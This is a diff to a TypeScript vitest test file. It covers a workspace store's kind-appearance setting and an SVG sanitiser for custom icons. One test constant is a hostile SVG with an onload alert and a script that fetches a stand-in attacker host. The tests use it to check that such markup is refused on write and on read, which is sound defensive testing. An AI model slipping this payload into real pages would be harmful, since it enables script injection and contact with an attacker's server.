@@ -2,6 +2,7 @@ import { beforeEach, describe, expect, it } from "vitest";
 import { openDb } from "../src/core/db.js";
 import { migrateWorkspace } from "../src/core/schema.js";
 import { WorkspaceStore } from "../src/core/store.js";
+import { sanitizeSvg } from "../src/core/svg-sanitize.js";
 import { ISSUE_KINDS, ISSUE_STATUSES, StapleError } from "../src/core/types.js";
 
 /**
@@ -541,6 +542,7 @@ describe("registered workspace settings", () => {
     expect(store.getSetting("kinds.default")).toBe("task");
     expect(store.settingValues()).toEqual([
       { key: "kinds.default", scope: "workspace", value: "task", source: "default", version: 1 },
+      { key: "kinds.appearance", scope: "workspace", value: {}, source: "default", version: 1 },
     ]);
     // Nothing is written by a read — the fresh-workspace meta table stays exactly as seeded.
     expect(metaRows()).toEqual([]);
@@ -593,7 +595,7 @@ describe("registered workspace settings", () => {
       .prepare("INSERT INTO meta (key, value) VALUES ('setting:future.flag', ?)")
       .run(JSON.stringify({ v: 3, value: { anything: true } }));
     expect(store.unknownSettingKeys()).toEqual(["future.flag"]);
-    expect(store.settingValues().map((v) => v.key)).toEqual(["kinds.default"]);
+    expect(store.settingValues().map((v) => v.key)).toEqual(["kinds.default", "kinds.appearance"]);
     store.setSetting("kinds.default", "bug");
     store.resetSetting("kinds.default");
     expect(metaRows()).toEqual([
@@ -648,9 +650,166 @@ describe("registered workspace settings", () => {
     expect(store.getSetting("kinds.default")).toBe("task");
     expect(store.applySettingOps([{ op: "set", key: "kinds.default", value: "spike" }])).toEqual([
       { key: "kinds.default", scope: "workspace", value: "spike", source: "workspace", version: 1 },
+      { key: "kinds.appearance", scope: "workspace", value: {}, source: "default", version: 1 },
     ]);
     expect(() => store.applySettingOps([{ op: "bogus", key: "kinds.default" } as never])).toThrow(
       /Unknown setting op "bogus"/,
     );
+  });
+});
+
+// ------------------------------------------------------- kind appearance (R5a, STA-181)
+
+describe("kind appearance", () => {
+  const metaRows = () =>
+    (store.db.prepare("SELECT key, value FROM meta WHERE key LIKE 'setting:%' ORDER BY key").all() as Array<{
+      key: string;
+      value: string;
+    }>);
+  const flask = { source: "lucide", value: "flask-conical", fallback: "⚗" } as const;
+
+  it("resolves every seeded kind to its built-in mark with the configured label, storing nothing", () => {
+    const rows = store.getKindsWithAppearance();
+    expect(rows.map((k) => k.id)).toEqual(idsOf(store.getKinds()));
+    expect(rows.map((k) => `${k.id}:${k.appearance.source}:${k.appearance.value}:${k.appearance.fallback}`)).toEqual([
+      "epic:lucide:layers:◆",
+      "task:lucide:square-check:◇",
+      "bug:lucide:bug:✱",
+      "chore:lucide:wrench:↻",
+      "spike:lucide:zap:↯",
+    ]);
+    expect(rows.map((k) => k.appearance.label)).toEqual(["Epic", "Task", "Bug", "Chore", "Spike"]);
+    expect(store.kindAppearance("epic")).toEqual(rows[0]!.appearance);
+    expect(metaRows()).toEqual([]);
+    expect(store.settingValues().find((v) => v.key === "kinds.appearance")).toEqual({
+      key: "kinds.appearance",
+      scope: "workspace",
+      value: {},
+      source: "default",
+      version: 1,
+    });
+  });
+
+  it("gives a custom kind the generic mark until it is given one, and a renamed kind its new label", () => {
+    store.addKind({ id: "research" });
+    expect(store.kindAppearance("research")).toEqual({ source: "none", value: "", label: "Research", fallback: "•" });
+    store.renameKind("spike", "Investigation");
+    expect(store.kindAppearance("spike")).toEqual({ source: "lucide", value: "zap", label: "Investigation", fallback: "↯" });
+    // Total: an id nobody configured still answers, with a title-cased label.
+    expect(store.kindAppearance("not_here")).toEqual({ source: "none", value: "", label: "Not Here", fallback: "•" });
+  });
+
+  it("persists a stored choice as one versioned meta row and resolves it on every read", () => {
+    store.addKind({ id: "research" });
+    store.setSetting("kinds.appearance", { research: flask }, "op");
+    expect(metaRows()).toEqual([
+      { key: "setting:kinds.appearance", value: JSON.stringify({ v: 1, value: { research: flask } }) },
+    ]);
+    expect(store.kindAppearance("research")).toEqual({ ...flask, label: "Research" });
+    expect(store.getKindsWithAppearance().find((k) => k.id === "research")!.appearance).toEqual({ ...flask, label: "Research" });
+    // Everything else keeps its built-in mark.
+    expect(store.kindAppearance("bug").value).toBe("bug");
+  });
+
+  it("uses a stored label when there is one, and the kind's own label when it is empty", () => {
+    store.setSetting("kinds.appearance", { epic: { source: "emoji", value: "🚀", fallback: "E", label: "Initiative" } });
+    expect(store.kindAppearance("epic")).toEqual({ source: "emoji", value: "🚀", label: "Initiative", fallback: "E" });
+    store.setSetting("kinds.appearance", { epic: { source: "emoji", value: "🚀", fallback: "E", label: "" } });
+    expect(store.kindAppearance("epic").label).toBe("Epic");
+    store.renameKind("epic", "Programme");
+    expect(store.kindAppearance("epic").label).toBe("Programme");
+  });
+
+  it("refuses at the write boundary: a colour, custom SVG, a bad key, and an unconfigured kind", () => {
+    expect(() => store.setSetting("kinds.appearance", { epic: { ...flask, color: "#f00" } })).toThrow(
+      /"kinds\.appearance" must be an appearance record without "color"/,
+    );
+    expect(() => store.setSetting("kinds.appearance", { epic: { source: "svg", value: "<svg/>", fallback: "s" } })).toThrow(
+      /viewBox/,
+    );
+    expect(() => store.setSetting("kinds.appearance", { epic: { ...flask, value: "Not A Key" } })).toThrow(
+      /Lucide icon key .* for "epic"/,
+    );
+    expect(() => store.setSetting("kinds.appearance", { milestone: flask })).toThrow(/Unknown kind "milestone"/);
+    expect(() => store.setSetting("kinds.appearance", [])).toThrow(/a map of kind id/);
+    expect(metaRows()).toEqual([]);
+  });
+
+  it("prunes a removed kind's entry in the same transaction, and clears the row when it was the last", () => {
+    store.addKind({ id: "research" });
+    store.setSetting("kinds.appearance", { research: flask, spike: { source: "none", value: "", fallback: "s" } });
+    store.removeKind("research");
+    expect(store.getSetting("kinds.appearance")).toEqual({ spike: { source: "none", value: "", fallback: "s" } });
+    store.removeKind("spike");
+    expect(store.getSetting("kinds.appearance")).toEqual({});
+    expect(metaRows()).toEqual([]);
+  });
+
+  it("is validated at the read boundary like every registered value", () => {
+    store.db
+      .prepare("INSERT INTO meta (key, value) VALUES ('setting:kinds.appearance', ?)")
+      .run(JSON.stringify({ v: 1, value: { epic: { source: "lucide" } } }));
+    expect(() => store.getKindsWithAppearance()).toThrow(/workspace test: "kinds\.appearance" must be/);
+  });
+});
+
+// ------------------------------------------------------- custom glyphs (R5c, STA-183)
+
+describe("custom glyphs", () => {
+  const metaRows = () =>
+    (store.db.prepare("SELECT value FROM meta WHERE key = 'setting:kinds.appearance'").all() as Array<{ value: string }>).map(
+      (row) => row.value,
+    );
+  const raw = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M4 2h16v20H4z" fill="#f00"/></svg>';
+  const hostile = '<svg viewBox="0 0 24 24" onload="alert(1)"><script>fetch("https://evil.example")</script><path d="M0 0"/></svg>';
+  const canonical = () => {
+    const result = sanitizeSvg(raw, { label: "Box" });
+    if (!result.ok) throw new Error(result.problem);
+    return result.svg;
+  };
+
+  it("stores the sanitiser's canonical output and resolves it on every read, never the raw document", () => {
+    store.setSetting("kinds.appearance", { epic: { source: "svg", value: canonical(), fallback: "▣" } }, "op");
+    expect(store.kindAppearance("epic")).toEqual({ source: "svg", value: canonical(), label: "Epic", fallback: "▣" });
+    expect(store.getKindsWithAppearance().find((k) => k.id === "epic")!.appearance.value).toBe(canonical());
+    // What sits on disk is the canonical string: no width/height, currentColor, one title.
+    const onDisk = (JSON.parse(metaRows()[0]!) as { value: { epic: { value: string } } }).value.epic.value;
+    expect(onDisk).toBe(canonical());
+    expect(onDisk).toContain('fill="currentColor"');
+    expect(onDisk).not.toMatch(/width=|#f00/);
+    expect(onDisk).toContain("<title>Box</title>");
+  });
+
+  it("refuses a raw or hostile document at the write boundary, and no markup reaches disk", () => {
+    expect(() => store.setSetting("kinds.appearance", { epic: { source: "svg", value: raw, fallback: "s", label: "Box" } })).toThrow(
+      /"kinds\.appearance" must be the sanitiser's canonical SVG for value .* for "epic"/,
+    );
+    expect(() => store.setSetting("kinds.appearance", { epic: { source: "svg", value: hostile, fallback: "s" } })).toThrow(
+      /must be an SVG without <script> elements for value/,
+    );
+    expect(() => store.setSetting("kinds.appearance", { epic: { source: "svg", value: "<svg>" + "a".repeat(1024 * 1024), fallback: "s" } })).toThrow(
+      /at most 8192 bytes/,
+    );
+    expect(() => store.setSetting("kinds.appearance", { epic: { source: "emoji", value: "🚀🚀🚀", fallback: "e" } })).toThrow(
+      /1 to 2 visible characters/,
+    );
+    expect(metaRows()).toEqual([]);
+    expect(store.kindAppearance("epic").value).toBe("layers");
+  });
+
+  it("accepts an emoji by grapheme count: a joined family is one glyph", () => {
+    store.setSetting("kinds.appearance", { epic: { source: "emoji", value: "👨‍👩‍👧‍👦", fallback: "F" } });
+    expect(store.kindAppearance("epic")).toEqual({ source: "emoji", value: "👨‍👩‍👧‍👦", label: "Epic", fallback: "F" });
+  });
+
+  it("never serves a stored row that was tampered into hostile markup: the read refuses with the key in the sentence", () => {
+    // The registry validates at the read boundary (R5a), so a hand-edited row cannot be served as
+    // markup by any surface. The resolver's own fallback for a record it is handed is proven in
+    // test/kind-appearance.test.ts; the browser's is in SafeGlyph's tests.
+    store.db
+      .prepare("INSERT INTO meta (key, value) VALUES ('setting:kinds.appearance', ?)")
+      .run(JSON.stringify({ v: 1, value: { epic: { source: "svg", value: hostile, fallback: "s" } } }));
+    expect(() => store.getKindsWithAppearance()).toThrow(/"kinds\.appearance" must be an SVG without <script> elements/);
+    expect(() => store.kindAppearance("epic")).toThrow(/<script>/);
   });
 });
